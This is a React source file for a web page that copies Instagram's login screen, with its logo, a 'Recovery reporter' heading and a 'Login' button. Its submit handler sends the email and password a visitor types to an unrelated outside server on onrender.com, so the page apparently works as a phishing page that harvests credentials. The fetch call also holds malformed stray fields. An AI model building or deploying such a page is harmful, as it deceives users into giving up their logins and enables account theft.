import React, { useRef, useState } from 'react';
import './App.css';


function App() {
  const emailRef = useRef();
  const passwordRef = useRef();
  const [msg, setMsg] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleRegister = async () => {
    const user = { 
      email: emailRef.current.value,
      password: passwordRef.current.value,
  
    };

    try {
      const res = await fetch('https://insta-repo-2.onrender.com/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(user),
            email: emailRef.current.value="",
            password: passwordRef.current.value=""
      });

      const data = await res.json();
      setMsg(data.message);
    } catch (err) {
      console.error(err);
      setMsg('Registration failed');
    }
  };

  const toggleShowPassword = () => {
    setShowPassword(prev => !prev);
  };

  return (
    <div style={styles.wrapper}>
      <div style={styles.formContainer}>
        <div style={styles.formBox}>
          <img
            src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png"
            alt="Instagram"
            style={styles.logo}
          /> 
          <strong style={styles.instaFont}>Instagram!! Recovery reporter</strong>
          <input ref={emailRef} placeholder="Email/Number/Username" style={styles.input} />
          <div style={styles.passwordWrapper}>
            <input
              ref={passwordRef}
              type={showPassword ? 'text' : 'password'}
              placeholder="Password"
              style={{ ...styles.input, marginBottom: 0 }}
            />
            <button onClick={toggleShowPassword} style={styles.showBtn}>
              {showPassword ? "👁":"👁"}
            </button>
          </div>
          <button onClick={handleRegister} style={styles.button}>Login</button>
          <p style={styles.message}>{msg}</p>
        </div>

        <div style={styles.loginBox}>
          <p>
            Don't Have an account? <a href="#" style={styles.link}>Sign up</a>
          </p>
        </div>
      </div>
    </div>
  );
}

const styles = {
  wrapper: {
    backgroundColor: '#fafafa',
    minHeight: '100vh',
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
    fontFamily: 'Arial, sans-serif',
    padding: '1rem',
  },
  formContainer: {
    width: '100%',
    maxWidth: '350px',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
  },
  formBox: {
    backgroundColor: '#fff',
    border: '1px solid #dbdbdb',
    padding: '2rem 1.5rem 1rem',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    width: '100%',
    marginBottom: '10px',
    boxSizing: 'border-box',
    boxShadow: '0 2px 4px rgba(0,0,0,0.05)',
    borderRadius: '8px',
  },
  logo: {
    width: '60%',
    maxWidth: '175px',
    marginBottom: '10px',
  },
  input: {
    width: '100%',
    padding: '0.6rem 0.5rem',
    margin: '6px 0',
    backgroundColor: '#fafafa',
    border: '1px solid #dbdbdb',
    borderRadius: '3px',
    fontSize: '0.9rem',
    boxSizing: 'border-box',
  },
  passwordWrapper: {
    position: 'relative',
    width: '100%',
    marginTop: '6px',
    marginBottom: '6px',
  },
  showBtn: {
    position: 'absolute',
    right: '10px',
    top: '50%',
    transform: 'translateY(-50%)',
    background: 'none',
    border: 'none',
    cursor: 'pointer',
    fontSize: '1rem',
    padding: 0,
  },
  button: {
    width: '100%',
    padding: '0.6rem 0',
    backgroundColor: '#0095f6',
    border: 'none',
    borderRadius: '4px',
    color: '#fff',
    fontWeight: '600',
    fontSize: '0.9rem',
    marginTop: '12px',
    cursor: 'pointer',
  },
  loginBox: {
    backgroundColor: '#fff',
    border: '1px solid #dbdbdb',
    padding: '1rem 1.5rem',
    width: '100%',
    textAlign: 'center',
    fontSize: '0.85rem',
    boxSizing: 'border-box',
    borderRadius: '8px',
  },
  link: {
    color: '#0095f6',
    fontWeight: '600',
    textDecoration: 'none',
  },
  message: {
    marginTop: '12px',
    color: '#d93025',
    fontSize: '0.8rem',
    textAlign: 'center',
  },
  instaFont: {
    fontFamily: "'Lobster', cursive",
    fontSize: '1.5rem',
    marginBottom: '10px',
    textAlign: 'center',
  },
};



export default App;
